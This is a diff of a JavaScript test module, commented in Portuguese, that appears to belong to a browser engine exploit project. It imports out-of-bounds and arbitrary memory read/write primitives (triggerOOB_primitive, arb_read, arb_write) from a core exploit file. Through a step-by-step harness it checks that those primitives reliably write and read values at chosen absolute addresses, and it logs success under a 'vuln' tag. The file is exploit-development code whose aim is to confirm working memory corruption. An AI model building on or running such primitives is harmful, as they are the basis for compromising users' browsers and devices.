@@ -1,137 +1,153 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v13: Usando Novas Primitivas arb_read/arb_write)
+// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v20: Teste de Transição de Endereço Detalhado)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    // oob_array_buffer_real, // Não mais necessário diretamente aqui
-    // oob_dataview_real,     // Não mais necessário diretamente aqui
-    // oob_write_absolute,    // Usado internamente por arb_write/arb_read no core_exploit
-    // oob_read_absolute,     // Usado internamente por arb_write/arb_read no core_exploit
     clearOOBEnvironment,
     isOOBReady,
-    arb_read,  // <-- NOVA PRIMITIVA IMPORTADA
-    arb_write  // <-- NOVA PRIMITIVA IMPORTADA
-} from '../core_exploit.mjs'; // Certifique-se que este é o core_exploit.mjs ATUALIZADO!
-// import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Não são mais necessários diretamente aqui
+    arb_read,  // Do core_exploit.mjs (versão síncrona, reutiliza DV - "v17_base")
+    arb_write  // Do core_exploit.mjs (versão síncrona, reutiliza DV - "v17_base")
+} from '../core_exploit.mjs';
 
-export const FNAME_MODULE_V28 = "GetterArbitraryRead_v13_UsingNewArbRW";
+export const FNAME_MODULE_V28 = "GetterArbitraryRead_v20_AddressTransition";
 
 // === Constantes ===
-// Endereço absoluto baixo que usaremos para testar arb_read/arb_write.
-const TEST_ABSOLUTE_ADDRESS = new AdvancedInt64(0x00000D00, 0x00000000); // 3328d
+const ADDR_X = new AdvancedInt64(0x00000D00, 0x00000000);
+const VALOR_X1 = new AdvancedInt64(0x11223344, 0x55667788);
+const VALOR_X2 = new AdvancedInt64(0x88776655, 0x44332211); // VALOR_X1 sobrescrito
 
-// Valores de teste para escrever e ler.
-const VALUE_A = new AdvancedInt64(0xAAAAAAAA, 0x11111111);
-const VALUE_B = new AdvancedInt64(0xBBBBBBBB, 0x22222222);
-const VALUE_C_32BIT = 0xCAFEBABE; // Para teste de leitura/escrita de 32 bits
+const ADDR_Y = new AdvancedInt64(0x00000E00, 0x00000000); // Novo endereço
+const VALOR_Y1 = new AdvancedInt64(0xAAAAAAAA, 0x11111111);
 
-// Não precisamos mais de um getter ou de offsets para copiar dados dentro do oob_buffer,
-// pois arb_read/arb_write operam diretamente e retornam valores.
+const ADDR_Z = new AdvancedInt64(0x00000F00, 0x00000000); // Outro novo endereço
+const VALOR_Z1 = new AdvancedInt64(0xBBBBBBBB, 0x22222222);
+
+
+const PAUSE_BETWEEN_STEPS_MS = 100;
+
+async function perform_rw_check(step, addr, value_to_write, expected_value_after_write, results_array) {
+    const FNAME_STEP = `${FNAME_MODULE_V28}.perform_rw_check`;
+    let step_success = false;
+    let read_val_str = "N/A";
+    let write_desc = value_to_write ? `Escrever ${value_to_write.toString(true)} em ${addr.toString(true)}` : "Nenhuma escrita";
+    let read_desc = `Ler de ${addr.toString(true)}, esperando ${expected_value_after_write.toString(true)}`;
+    
+    logS3(`    ${step}: Iniciando - ${write_desc} & ${read_desc}`, "info", FNAME_STEP);
+
+    try {
+        if (value_to_write) {
+            arb_write(addr, value_to_write, 8);
+            logS3(`        ${step}: Escrita (supostamente) realizada.`, "debug", FNAME_STEP);
+            await PAUSE_S3(PAUSE_BETWEEN_STEPS_MS / 2); // Pausa curta após escrita
+        }
+
+        const read_obj = arb_read(addr, 8);
+        read_val_str = isAdvancedInt64Object(read_obj) ? read_obj.toString(true) : "ERRO_LEITURA";
+        
+        if (expected_value_after_write.equals(read_obj)) {
+            step_success = true;
+            logS3(`        ${step}: Lido ${read_val_str} - CORRETO!`, "good", FNAME_STEP);
+        } else {
+            logS3(`        ${step}: Lido ${read_val_str} (Esperado: ${expected_value_after_write.toString(true)}) - INCORRETO!`, "error", FNAME_STEP);
+        }
+    } catch (e) {
+        logS3(`        ${step}: ERRO na operação: ${e.message}`, "error", FNAME_STEP);
+        read_val_str = `ERRO_CATCH: ${e.message}`;
+    }
+    results_array.push({ step, address: addr.toString(true), written: value_to_write ? value_to_write.toString(true) : "N/A", expected_read: expected_value_after_write.toString(true), actual_read: read_val_str, success: step_success });
+    await PAUSE_S3(PAUSE_BETWEEN_STEPS_MS);
+    return step_success;
+}
 
 export async function executeArrayBufferVictimCrashTest() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testNewArbitraryRWPrimitives`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Testando Novas Primitivas arb_read/arb_write ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testAddressTransition`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Transição de Endereço Detalhado (v20) ---`, "test", FNAME_CURRENT_TEST);
     document.title = `${FNAME_MODULE_V28} Inic...`;
 
     let errorCapturedMain = null;
-    let exploit_result = {
-        success: false,
-        address_targeted_str: TEST_ABSOLUTE_ADDRESS.toString(true),
-        value_A_written_str: VALUE_A.toString(true),
-        value_A_read_back_str: null,
-        value_B_written_str: VALUE_B.toString(true),
-        value_B_read_back_str: null,
-        value_C_written_str: toHex(VALUE_C_32BIT),
-        value_C_read_back_str: null,
-        message: "Teste não iniciado."
-    };
+    let overall_test_success = true;
+    let final_message = "Todos os testes de transição executados.";
+    let all_results = [];
 
     try {
-        // PASSO 1: Inicializar o ambiente OOB.
-        // triggerOOB_primitive no core_exploit.mjs atualizado já deve expandir m_length.
         await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) { // isOOBReady no core_exploit.mjs atualizado verifica m_length expandido.
-            throw new Error("Ambiente OOB não pôde ser inicializado ou não está pronto (m_length não expandido?).");
+        if (!isOOBReady()) {
+            throw new Error("Ambiente OOB inicial principal não pôde ser configurado.");
         }
-        logS3("PASSO 1: Ambiente OOB inicializado e pronto para L/E Arbitrária.", "info", FNAME_CURRENT_TEST);
+        logS3("PASSO GLOBAL: Ambiente OOB inicial principal configurado.", "info", FNAME_CURRENT_TEST);
 
-        // PASSO 2: Testar arb_write e arb_read com VALOR_A (64 bits)
-        logS3(`PASSO 2: Tentando escrever VALOR_A (${exploit_result.value_A_written_str}) no endereço ${exploit_result.address_targeted_str}...`, "info", FNAME_CURRENT_TEST);
-        arb_write(TEST_ABSOLUTE_ADDRESS, VALUE_A, 8);
-        logS3(`  Escrita de VALOR_A (supostamente) realizada.`, "info", FNAME_CURRENT_TEST);
+        // Teste 1: Escrita/Leitura no mesmo ADDR_X
+        if (!await perform_rw_check("T1.1_WriteX1", ADDR_X, VALOR_X1, VALOR_X1, all_results)) overall_test_success = false;
+        if (!await perform_rw_check("T1.2_ReadX1", ADDR_X, null, VALOR_X1, all_results)) overall_test_success = false; // Lê o que foi escrito
+        if (!await perform_rw_check("T1.3_WriteX2", ADDR_X, VALOR_X2, VALOR_X2, all_results)) overall_test_success = false; // Sobrescreve
+        if (!await perform_rw_check("T1.4_ReadX2", ADDR_X, null, VALOR_X2, all_results)) overall_test_success = false; // Lê o novo valor
+        logS3("--- Teste 1 (Mesmo Endereço) Concluído ---", "subtest", FNAME_CURRENT_TEST);
 
-        logS3(`  Tentando ler de volta do endereço ${exploit_result.address_targeted_str}...`, "info", FNAME_CURRENT_TEST);
-        const read_A_obj = arb_read(TEST_ABSOLUTE_ADDRESS, 8);
-        exploit_result.value_A_read_back_str = isAdvancedInt64Object(read_A_obj) ? read_A_obj.toString(true) : "ERRO_LEITURA_A";
-        logS3(`  Valor lido (esperado A): ${exploit_result.value_A_read_back_str}`, "leak", FNAME_CURRENT_TEST);
+        // Teste 2: Escreve em ADDR_Y, depois lê de ADDR_Y
+        if (!await perform_rw_check("T2.1_WriteY1", ADDR_Y, VALOR_Y1, VALOR_Y1, all_results)) overall_test_success = false;
+        if (!await perform_rw_check("T2.2_ReadY1", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false;
+        logS3("--- Teste 2 (Novo Endereço Y) Concluído ---", "subtest", FNAME_CURRENT_TEST);
 
-        if (exploit_result.value_A_read_back_str !== exploit_result.value_A_written_str) {
-            throw new Error(`Falha no teste de VALOR_A: Lido ${exploit_result.value_A_read_back_str}, Esperado ${exploit_result.value_A_written_str}`);
-        }
-        logS3(`  SUCESSO: VALOR_A escrito e lido corretamente!`, "good", FNAME_CURRENT_TEST);
+        // Teste 3: Escreve em ADDR_Z, depois lê de ADDR_Z
+        if (!await perform_rw_check("T3.1_WriteZ1", ADDR_Z, VALOR_Z1, VALOR_Z1, all_results)) overall_test_success = false;
+        if (!await perform_rw_check("T3.2_ReadZ1", ADDR_Z, null, VALOR_Z1, all_results)) overall_test_success = false;
+        logS3("--- Teste 3 (Novo Endereço Z) Concluído ---", "subtest", FNAME_CURRENT_TEST);
 
-        // PASSO 3: Testar arb_write e arb_read com VALOR_B (64 bits, sobrescrevendo A)
-        logS3(`PASSO 3: Tentando escrever VALOR_B (${exploit_result.value_B_written_str}) no endereço ${exploit_result.address_targeted_str}...`, "info", FNAME_CURRENT_TEST);
-        arb_write(TEST_ABSOLUTE_ADDRESS, VALUE_B, 8);
-        logS3(`  Escrita de VALOR_B (supostamente) realizada.`, "info", FNAME_CURRENT_TEST);
-
-        logS3(`  Tentando ler de volta do endereço ${exploit_result.address_targeted_str}...`, "info", FNAME_CURRENT_TEST);
-        const read_B_obj = arb_read(TEST_ABSOLUTE_ADDRESS, 8);
-        exploit_result.value_B_read_back_str = isAdvancedInt64Object(read_B_obj) ? read_B_obj.toString(true) : "ERRO_LEITURA_B";
-        logS3(`  Valor lido (esperado B): ${exploit_result.value_B_read_back_str}`, "leak", FNAME_CURRENT_TEST);
-
-        if (exploit_result.value_B_read_back_str !== exploit_result.value_B_written_str) {
-            throw new Error(`Falha no teste de VALOR_B: Lido ${exploit_result.value_B_read_back_str}, Esperado ${exploit_result.value_B_written_str}`);
-        }
-        logS3(`  SUCESSO: VALOR_B escrito e lido corretamente!`, "good", FNAME_CURRENT_TEST);
-
-        // PASSO 4: Testar arb_write e arb_read com VALOR_C (32 bits)
-        // Vamos usar um offset pequeno do endereço principal para não interferir com o QWORD anterior, se quisermos verificar depois.
-        // Ou podemos simplesmente sobrescrever. Para simplificar, vamos sobrescrever os primeiros 4 bytes.
-        const address_for_c = TEST_ABSOLUTE_ADDRESS; // Escreve no mesmo local, afetando parte de B
-        logS3(`PASSO 4: Tentando escrever VALOR_C (${exploit_result.value_C_written_str}) no endereço ${address_for_c.toString(true)} (32 bits)...`, "info", FNAME_CURRENT_TEST);
-        arb_write(address_for_c, VALUE_C_32BIT, 4);
-        logS3(`  Escrita de VALOR_C (supostamente) realizada.`, "info", FNAME_CURRENT_TEST);
-
-        logS3(`  Tentando ler de volta (32 bits) do endereço ${address_for_c.toString(true)}...`, "info", FNAME_CURRENT_TEST);
-        const read_C_val = arb_read(address_for_c, 4); // Lê como número
-        exploit_result.value_C_read_back_str = toHex(read_C_val);
-        logS3(`  Valor lido (esperado C): ${exploit_result.value_C_read_back_str}`, "leak", FNAME_CURRENT_TEST);
+        // Teste 4: Verificar se os valores anteriores (X2, Y1) ainda estão corretos
+        logS3("--- Iniciando Teste 4: Re-verificação de Endereços Anteriores ---", "subtest", FNAME_CURRENT_TEST);
+        if (!await perform_rw_check("T4.1_ReReadX2", ADDR_X, null, VALOR_X2, all_results)) overall_test_success = false;
+        if (!await perform_rw_check("T4.2_ReReadY1", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false;
+        logS3("--- Teste 4 (Re-verificação) Concluído ---", "subtest", FNAME_CURRENT_TEST);
         
-        if (exploit_result.value_C_read_back_str !== exploit_result.value_C_written_str) {
-            throw new Error(`Falha no teste de VALOR_C: Lido ${exploit_result.value_C_read_back_str}, Esperado ${exploit_result.value_C_written_str}`);
-        }
-        logS3(`  SUCESSO: VALOR_C (32 bits) escrito e lido corretamente!`, "good", FNAME_CURRENT_TEST);
+        // Teste 5: Simular o problema do bloco, mas com mais isolamento
+        logS3("--- Iniciando Teste 5: Bloco Isolado (ADDR_Y, ADDR_Z) ---", "subtest", FNAME_CURRENT_TEST);
+        // Re-escreve Y1 e Z1 para garantir estado inicial para este teste de bloco
+        if (!await perform_rw_check("T5.0a_ReWriteY1", ADDR_Y, VALOR_Y1, VALOR_Y1, all_results)) overall_test_success = false;
+        if (!await perform_rw_check("T5.0b_ReWriteZ1", ADDR_Z, VALOR_Z1, VALOR_Z1, all_results)) overall_test_success = false;
 
-        // Se todos os testes passaram
-        exploit_result.success = true;
-        exploit_result.message = `SUCESSO! Primitivas arb_read/arb_write funcionaram para 64 e 32 bits no endereço ${exploit_result.address_targeted_str}.`;
-        document.title = `${FNAME_MODULE_V28}: ARB R/W OK!`;
-        logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
+        logS3("    T5: Lendo ADDR_Y primeiro, depois ADDR_Z", "info", FNAME_CURRENT_TEST);
+        if (!await perform_rw_check("T5.1_ReadY1_Again", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false;
+        if (!await perform_rw_check("T5.2_ReadZ1_Again", ADDR_Z, null, VALOR_Z1, all_results)) overall_test_success = false;
+        
+        // Inverte a ordem de escrita para ver se influencia a leitura "presa"
+        logS3("    T5: Re-escrevendo em ordem Z depois Y, depois lendo Y e Z", "info", FNAME_CURRENT_TEST);
+        if (!await perform_rw_check("T5.3a_ReWriteZ1_Order2", ADDR_Z, VALOR_Z1, VALOR_Z1, all_results)) overall_test_success = false;
+        if (!await perform_rw_check("T5.3b_ReWriteY1_Order2", ADDR_Y, VALOR_Y1, VALOR_Y1, all_results)) overall_test_success = false;
+        
+        if (!await perform_rw_check("T5.4_ReadY1_AfterReverseWrite", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false; // Espera Y1, mas pode pegar Z1 se o problema persistir com a última escrita no DV
+        if (!await perform_rw_check("T5.5_ReadZ1_AfterReverseWrite", ADDR_Z, null, VALOR_Z1, all_results)) overall_test_success = false;
+
+        logS3("--- Teste 5 (Bloco Isolado) Concluído ---", "subtest", FNAME_CURRENT_TEST);
+
+
+        if (overall_test_success) {
+            final_message = "SUCESSO GERAL: Todos os testes de transição de endereço passaram.";
+        } else {
+            final_message = "FALHA PARCIAL: Um ou mais testes de transição de endereço falharam.";
+        }
+        logS3(`MSG FINAL: ${final_message}`, overall_test_success ? "vuln" : "error", FNAME_CURRENT_TEST);
+        document.title = `${FNAME_MODULE_V28}: ${overall_test_success ? "TRANS OK" : "TRANS FALHA"}`;
 
     } catch (e_outer_main) {
         errorCapturedMain = e_outer_main;
         logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
         if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
-        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`; // Sobrescreve msg de sucesso
+        final_message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
         document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
+        overall_test_success = false;
     } finally {
-        clearOOBEnvironment({force_clear_even_if_not_setup: true}); // Sempre limpa o ambiente
+        clearOOBEnvironment({force_clear_even_if_not_setup: true});
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
-        logS3(`Resultado Teste Novas Primitivas arb_read/arb_write (v13): Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
-        logS3(`  Endereço Alvo: ${exploit_result.address_targeted_str}`, "info", FNAME_CURRENT_TEST);
-        logS3(`  Teste A (64b): Escrito=${exploit_result.value_A_written_str}, Lido=${exploit_result.value_A_read_back_str}`, "info", FNAME_CURRENT_TEST);
-        logS3(`  Teste B (64b): Escrito=${exploit_result.value_B_written_str}, Lido=${exploit_result.value_B_read_back_str}`, "info", FNAME_CURRENT_TEST);
-        logS3(`  Teste C (32b): Escrito=${exploit_result.value_C_written_str}, Lido=${exploit_result.value_C_read_back_str}`, "info", FNAME_CURRENT_TEST);
+        logS3(`Resultado Final Teste de Transição (v20): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
+        all_results.forEach(res => {
+            logS3(`  DETALHE ${res.step}: Addr=${res.address}, Escrito=${res.written}, Lido=${res.actual_read}, Esperado=${res.expected_read}, Sucesso=${res.success}${res.error ? `, Erro='${res.error}'` : ''}`, res.success ? "debug" : "error", FNAME_CURRENT_TEST);
+        });
     }
 
     return {
         errorOccurred: errorCapturedMain,
-        exploit_attempt_result: exploit_result,
-        toJSON_details: { 
-            probe_variant: FNAME_MODULE_V28, // Mantendo a estrutura, embora não haja mais "probe" aqui
-            status: exploit_result.success ? "success_new_arb_rw" : "failed_new_arb_rw",
-            message: exploit_result.message
-        }
+        overall_success: overall_test_success,
+        final_message: final_message,
+        results_details: all_results
     };
 }
